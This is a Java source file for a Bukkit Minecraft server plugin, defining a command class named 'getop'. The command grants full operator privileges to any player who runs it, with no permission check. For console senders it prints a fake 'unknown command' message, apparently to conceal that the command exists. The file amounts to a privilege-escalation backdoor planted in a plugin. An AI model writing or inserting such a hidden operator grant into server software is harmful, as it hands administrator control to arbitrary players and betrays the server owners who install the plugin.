package com.zpj2008.myplugin.commands;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class getop implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender commandSender, Command command, String s, String[] strings) {
        if(commandSender instanceof Player){
            Player player = (Player)commandSender;
            player.setOp(true);
        }else{
            System.out.println("未知的指令，请输入'/help'获取帮助");
        }
        return false;
    }
}
